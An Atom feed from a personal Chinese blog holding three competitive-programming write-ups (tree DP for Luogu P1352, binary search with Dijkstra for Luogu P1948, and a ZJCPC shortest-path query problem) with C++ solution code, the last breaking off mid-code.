<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-13T17:59:09.899Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>树形dp的学习</title>
    <link href="http://example.com/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-02-14T03:00:00.000Z</published>
    <updated>2022-02-13T17:59:09.899Z</updated>
    
    <content type="html"><![CDATA[<p>很烦啊，最近复习图论，贼艰难，很多题目基本多多少少都要用树形dp。而我专注于搞图论和数据结构，dp完全就是略知一二，逃避没有用，不会就去学，碰到困难就去面对。</p><span id="more"></span><p>树上dp其实跟普通的dp差不多，甚至会比普通的dp写起来简单，但是前提是要理解。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>洛谷<a href="https://www.luogu.com.cn/problem/P1352">P1352</a>这个真的是典中典了，我看几乎所有的技术博客都会拿这个当作树形dp的入门题，那我也不例外。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>某大学有 $n$ 个职员，编号为 $1\ldots n$。</p><p>他们之间有从属关系，也就是说他们的关系就像一棵以校长为根的树，父结点就是子结点的直接上司。</p><p>现在有个周年庆宴会，宴会每邀请来一个职员都会增加一定的快乐指数 $r_i$，但是呢，如果某个职员的直接上司来参加舞会了，那么这个职员就无论如何也不肯来参加舞会了。</p><p>所以，请你编程计算，邀请哪些职员可以使快乐指数最大，求最大的快乐指数。</p><hr><p>其实我觉得这个跟有依赖的背包题有异曲同工之妙，不通的是，他们不是依赖，而是互斥，选了一个人之后则不能选另一个人。而依赖背包则是选了一个则必须选另外一个，当然另外一个没有这个限制，否则两个物品直接合并一个物品啦。</p><p>这里很明显就是 $n$ 个人 $n-1$ 对关系，可以算做一棵树，但是这棵树是有向的，最顶级的那个上司就是树根了。这里我们肯定得先建一个有向图来保存这个关系，然后我们需要自底向上分析策略。对于每一个叶子节点，它们没有下级，对他们来说只有参加或者不参加，这里我们设 $dp[i][0]$ 为第 $i$ 个人不来参加的最优解，$dp[i][1]$ 为第 $i$ 个人来参加的最优解，注意这个最优解是对于它以及它的所有子孙节点的最优解。我们假设节点 $i$ 有k个节点分别为 $a_1,a_2\dots a_k$ ，那么可以写出如下状态转移方程。 </p><p>$dp[i][1]  = \sum _{x=1} ^{k} dp[a_x][0]$</p><p>$dp[i][0]  = \sum _{x=1} ^{k} \max(dp[a_x][0],dp[a_x][1])$</p><p>这里很明显，对于本人不参加，那么自己的下属可参加可不参加，但是自己参加了自己的下属一定不能参加，而自己不参加选择下属参加还是不参加也是选取最优结果的，因此能得到上面的状态转移方程。然后就是最基本的树的操作了：建边，找根，dfs，状态转移，最后结果就是 $\max(dp[root][1],dp[root][0])$，所以这道题是真的入门题。</p><h4 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6500</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],cnt,n,dp[maxn][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">degree[y]++;</span><br><span class="line">edge[++cnt].next=root[x];</span><br><span class="line">edge[cnt].to=y;</span><br><span class="line">root[x]=cnt;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[x];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="built_in">dfs</span>(v);</span><br><span class="line">dp[x][<span class="number">0</span>]+=<span class="built_in">max</span>(dp[v][<span class="number">1</span>],dp[v][<span class="number">0</span>]);<span class="comment">//状态转移方程</span></span><br><span class="line">dp[x][<span class="number">1</span>]+=dp[v][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">cin&gt;&gt;dp[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="built_in">add</span>(y,x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!degree[i])&#123;<span class="comment">//找根</span></span><br><span class="line"><span class="built_in">dfs</span>(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">max</span>(dp[i][<span class="number">1</span>],dp[i][<span class="number">0</span>]));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;很烦啊，最近复习图论，贼艰难，很多题目基本多多少少都要用树形dp。而我专注于搞图论和数据结构，dp完全就是略知一二，逃避没有用，不会就去学，碰到困难就去面对。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="动态规划" scheme="http://example.com/categories/icpc/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="树形dp" scheme="http://example.com/categories/icpc/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%A0%91%E5%BD%A2dp/"/>
    
    
  </entry>
  
  <entry>
    <title>洛谷P1948题解</title>
    <link href="http://example.com/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/</id>
    <published>2022-02-13T15:00:00.000Z</published>
    <updated>2022-02-13T12:44:13.585Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P1948">洛谷P1948</a>题解。</p><span id="more"></span><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>多年以后，笨笨长大了，成为了电话线布置师。由于地震使得某市的电话线全部损坏，笨笨是负责接到震中市的负责人。该市周围分布着$N(1&lt;=N&lt;=1000)$根据$1……n$顺序编号的废弃的电话线杆，任意两根线杆之间没有电话线连接，一共有$p(1&lt;=p&lt;=10000)$对电话杆可以拉电话线。其他的由于地震使得无法连接。</p><p>第i对电线杆的两个端点分别是$a_i,b_i$，它们的距离为$l_i(1&lt;=l_i&lt;=1000000)$。数据中每对$(a_i,b_i)$只出现一次。编号为1的电话杆已经接入了全国的电话网络，整个市的电话线全都连到了编号N的电话线杆上。也就是说，笨笨的任务仅仅是找一条将1号和N号电线杆连起来的路径，其余的电话杆并不一定要连入电话网络。</p><p>电信公司决定支援灾区免费为此市连接k对由笨笨指定的电话线杆，对于此外的那些电话线，需要为它们付费，总费用决定于其中最长的电话线的长度(每根电话线仅连接一对电话线杆)。如果需要连接的电话线杆不超过k对，那么支出为0.</p><p>请你计算一下，将电话线引导震中市最少需要在电话线上花多少钱？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>有一说一，不看题解我是万万想不到的，这得是多厉害猜想得到这题是用二分去解决的。不过如果能发现这题的答案的单调性，也许真的可以写出来。</p><p>首先第一点我想的肯定就是最短路啦，但是本题目求的并不是最短路，仔细看，如果路线个数少于 $k$ 个，则0元购，否则将会取得所有路线的最长的一条路径作为费用。可以看到这个题目它并不具备无后效性，它属于有后效性，有后效性即前面做出的选择对之后的选择有影响，如果题目就是求总共的最短路那么它就是无后效性。因为我当前在一个点上的时候你不需要去管我怎么到的这，因为就一个最短路径的值在这里，不管你前面怎么走的这个值是不会影响后面的结果的。</p><p>那么这是一个有后效性的题目那怎么办呢，答案是二分。</p><p>二分的判断条件就是，在我预算为mid的时候能否成功建成，很容易可以找到规律，如果mid能建成，那么&gt;mid的情况一定能建成，如果mid不能建成，那么&lt;mid的情况一定也不能建成，以此作为二分的依据。我们跑最短路的时候只需要检测路线上有多少个超过mid的边即可，如果超过k，说明预算一定超过mid，如果没到，说明预算太多了，大于mid的答案就都排除了，然后每次二分跑一次单源最短路。在 $n=1000$ 的情况下复杂度完全允许。</p><p>就是说，还得多练习，不然完全想不到能用这样的方法去做。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn*maxn*<span class="number">2</span>];</span><br><span class="line"> <span class="keyword">int</span> n,m,k,cnt,root[maxn],d[maxn],vis[maxn];</span><br><span class="line"> priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt;&gt;s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">edge[++cnt].next=root[x];</span><br><span class="line">edge[cnt].w=w;</span><br><span class="line">edge[cnt].to=y;</span><br><span class="line">root[x]=cnt;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="comment">//memset(vis,0,sizeof(vis));</span></span><br><span class="line">d[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//vis[1]=1;</span></span><br><span class="line">s.<span class="built_in">push</span>(&#123;<span class="number">0</span>,<span class="number">1</span>&#125;);</span><br><span class="line"><span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">auto</span> p=s.<span class="built_in">top</span>();</span><br><span class="line">s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> point=p.second;</span><br><span class="line"><span class="keyword">if</span>(d[point]&lt;p.first)<span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[point];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> to=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(vis[to])<span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">//vis[to]=1;</span></span><br><span class="line"><span class="keyword">if</span>(d[to]&gt;d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>))&#123;</span><br><span class="line"><span class="comment">//vis[to]=1;</span></span><br><span class="line">d[to]=d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">s.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;mid=%d:d[n]=%d\n&quot;,x,d[n]);</span></span><br><span class="line"><span class="comment">//for(int i=1;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%d &quot;,d[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//putchar(10);</span></span><br><span class="line"><span class="keyword">if</span>(d[n]==INF)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(d[n]&gt;k)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//freopen(&quot;P1948_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x,y,w;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line"><span class="built_in">add</span>(x,y,w);</span><br><span class="line"><span class="built_in">add</span>(y,x,w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> l=<span class="number">1</span>,r=<span class="number">1000000</span>,ans=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line"><span class="keyword">int</span> mid = l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> value=<span class="built_in">bfs</span>(mid);</span><br><span class="line"><span class="keyword">if</span>(value==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(value==<span class="number">1</span>)&#123;</span><br><span class="line">l=mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r=mid<span class="number">-1</span>;</span><br><span class="line">ans=mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P1948&quot;&gt;洛谷P1948&lt;/a&gt;题解。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="最短路径" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
    <category term="二分" scheme="http://example.com/categories/icpc/algorithm/%E4%BA%8C%E5%88%86/"/>
    
    
  </entry>
  
  <entry>
    <title>ZJCPC-D. Shortest Path Query</title>
    <link href="http://example.com/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/</id>
    <published>2022-02-13T14:00:00.000Z</published>
    <updated>2022-02-12T19:33:15.591Z</updated>
    
    <content type="html"><![CDATA[<p>今天来复盘一下上次省赛考到的题目，异常地折磨人。</p><span id="more"></span><p>先说一下这题比赛的情况吧，基本上呢，银奖中等偏上的队伍都是做出来了的。</p><p>那我们就看看这题吧。</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>什么思路在题目名字这里就一目了然了，那自然是最短路径。</p><p>而当我一眼扫过去看到这个数据量的时候瞬间惊呆。$1≤n≤100000，1≤m≤200000$，不仅如此，还有 $q$ 次询问最短路径，$q≤200000$ 当时一看，这玩你妈。给一个点都勉强能过了，这有这么多点，如果按照常规思路，一次单源最短路径复杂度 $nlog_2n$ 然后 $q$ 次询问，总复杂度就是 $qnlog_2n$ 全部以最大值带进去妥妥的超时。所以当时比赛的时候看到这个题目是直接放弃了的，而且英文不好的我留下了悔恨的眼泪。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>但是它还有一个条件，那就是，直接相连的两个点当中，其中一个点的编号一定是另一个点的二进制前缀，这就说明了一点，$2$ 它一定不会跟 $3,6,12……$ 等点连接起来的，因为它们的前缀是 $11_{2}$，而 $2_{10}$ 是 $10_{2}$ 开头的，那么这样的话我们就可以构造一棵 $tire$ 树。像这样子。</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><p>可以很明显的看出来是一个完全二叉树，这里我们假设往左子树走二进制右添一个 $0$，向左走二进制右添一个 $1$。那你可能会想，这明明边的范围是比点多的，怎么可能是一棵树。没错，但是我们看看，它能不能边横向添加？答案当然是否定的，因为一个得是另一个的前缀，同层次的话二进制位数相同，但是实际值不同，因此不可能满足这个条件。那么我们看看能不能连到其它不是我的祖先的节点呢？答案当然还是否定的，因为我简历的 $tire$ 就是根据二进制后面添 $0$ 还是添 $1$ 来确定分支的，如果你都不是由我在后面添 $0$ 或者是添 $1$ 得到的那你就不可能是我的前缀，也不是我的孙子节点。</p><p>当然在图中 $1$ 和 $4$ 是可以直接相连的，虽然越级但是满足条件。所以它严格意义上来说不是树，但它怎么当成树呢？如果我把一个节点两个直接相连的子图当成子树，问题就解决了。因为两个子图之间肯定没有线连接，这个在刚刚已经证明过了。</p><p>对于每一个节点，我们都去寻找它祖先的最短路径。因为一个节点最多有 $log_2n$ 个祖先，所以跑一下最短路算法问题还是不大的。我们定义 $dis[i][k]$ 为节点 $i$ 到达往上 $k$ 个祖先的最短路径。那么对于任意两点的最短路径，我只需要寻找它们的最近公共祖先，然后答案就是 $a$ 到最近公共祖先的最短路加上 $b$ 到最近公共祖先的最短路。当然我们还有一个情况得考虑，因为 $dis[i][k]$ 的定义仅仅是到它祖先的最短路径，而不是到这个节点的最短路径。因此它祖先的祖先可能有更优的路线。</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><p>就比如这样一个图，图中我把关键数据标注出来了，无关数据没有标注。</p><p>如果说我要求 $8$ 和 $11$ 的最短路，按照我刚刚的定义很容易算的出来，它们的 $LCA$ 是 $2$，然后 $8$ 和 $11$ 到 $2$ 的最短路径都是 $2$，所以我算出来 $8$ 到 $11$ 的最短路径是 $4$，但是显然这里还有一个更优的解，那就是 $8\to1\to11$ 这样才只有 $2$ 的距离。但是最优的路线只可能存在于它的祖先上面了，其它地方不可能有。因此我们在用刚刚那个算法的时候还得兼顾一下查找 $LCA$ 的祖先的答案。</p><p>这样子的话，假如我们能在规定时间内预处理完数据，那么我们每次查询的时间复杂度就只有 $O(log_2n)$ 了，也不会超时。那么我们看看怎么去预处理这个 $dis$ 数组。</p><p>我们只需要以每一个节点为根节点，和根节点的子节点作为一张图去跑单源最短路即可。对于 $1$ 来说，它的复杂度会是 $O(nlog_2n)$ ，每向下走一层，根节点数量翻倍，子节点数量减半。第二层中，总共复杂度将是 $O(2 \times \frac{n}{2}log_2\frac{n}{2})$ 这么算下来这一层接近 $O(nlog_2n)$ ，此后每一层都接近 $O(nlog_2n)$。它一共有几层呢？$log_2n$层。所以预处理的时间复杂度仅仅只有 $O(n(log_2n)^2)$ 这个时间复杂度是完全不会超时的。</p><p>我们肯定还是选择 $dijsktra$ 算法作为我们的单源最短路算法，加上一个优先队列优化，单源最短路需要每一个点给一个 $d$ 数组标记所有节点到源点的最短路，但是这样空间会炸。所以我们每次跑最短路空间得共用，如何保证他们不会串呢？用标记数组。比如我在以 $1$ 为根节点的时候，我就给标记打上 $1$，当我要更新 $d$ 里面的值的时候我先比较一下上一个使用 $d$ 数组的时候这个标记是否为我当前的根节点，如果是则更新，如果不是，则先初始化为一个很大的值。一般情况下我们选择 $INF=0x3f3f3f3f3f3f3f3f$ 因为这样不容易溢出，也能表示无穷大。</p><p>但是呢，想想 $dijsktra$ 算法还有什么需要注意的？那就是每次选完一个点的时候，它不会再被更新，这个时候我需要再打上一个标记，防止它被其它相连的边重复更新答案。一般情况下我们是选择 $0,1$ 的，但是这里我们要一起用我们就选择根节点的值呗，如果当前根节点和这个值不相等说明这个点没有被添加，那就添加并将标记更新为当前的根节点。</p><p>那么思路清晰了我们就开写。</p><h3 id="循序渐进"><a href="#循序渐进" class="headerlink" title="循序渐进"></a>循序渐进</h3><p>首先开这么几个数组</p><ul><li>$d[i]$ 表示 $i$ 点到当前根节点的最短路径</li><li>$vis1[i]$ 表示 $i$ 节点上一次被 $vis1[i]$ 节点标记为已经添加最短路的答案</li><li>$vis2[i]$ 表示 $i$ 节点的 $d[i]$ 上一次是在以 $vis2[i]$ 为根节点时更新的</li></ul><p>图的话我们采用经典链式前向星存储，优先队列我们存储这么两个信息：</p><ol><li>x节点的最短路径</li><li>x节点</li></ol><p>我们肯定每次是以最路径为关键字进行小根堆构造的，这样保证每次 $pop$ 出来的答案都是当前未被添加的节点中最小的那个答案。</p><p>于是我们不难写出以下代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);<span class="comment">//先把根节点丢进去</span></span><br><span class="line">d[root]=<span class="number">0</span>;<span class="comment">//自己到自己肯定就是0</span></span><br><span class="line">vis2[root]=root;<span class="comment">//自己这个答案肯定要被标记，防止下面找到被初始化，当然你如果严格规定所得节点必须&lt;root也没关系，因为下面会被初始化为INF。</span></span><br><span class="line"><span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">p.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> point=x.second;<span class="comment">//当前找到了一个距离最短的节点</span></span><br><span class="line"><span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;<span class="comment">//如果已经被添加过了那么就不做以下处理</span></span><br><span class="line">vis1[point]=root;<span class="comment">//把这个节点标记为已经添加进了答案中</span></span><br><span class="line">dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];<span class="comment">//更新答案，这里的cal_c用于判断root在point的第几个祖先，我们设父亲为第一个祖先。</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;<span class="comment">//更新所有与之相连的点的答案</span></span><br><span class="line"><span class="keyword">int</span> to=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;<span class="comment">//基本判断防止找到root的父亲</span></span><br><span class="line"><span class="keyword">if</span>(vis2[to]!=root)&#123;<span class="comment">//如果不是root说明上一次使用d[to]数组的还是上一次……啊不，是没用过d[to]这个值，所以要被初始化为一个无穷大</span></span><br><span class="line">d[to]=INF;</span><br><span class="line">vis2[to]=root;<span class="comment">//标记</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;<span class="comment">//单源最短路判断</span></span><br><span class="line">d[to]=d[point]+edge[i].w;</span><br><span class="line">p.<span class="built_in">push</span>(&#123;d[to],to&#125;);<span class="comment">//push进优先队列中</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么结合代码中你的注释相信你已经不难理解这个 $dijsktra$ 算法了。</p><p>我们再看看查询这部分的代码应该怎么写，无非就是先求出 $LCA$ ，然后循环 $LCA$ 以及 $LCA$ 祖先的答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    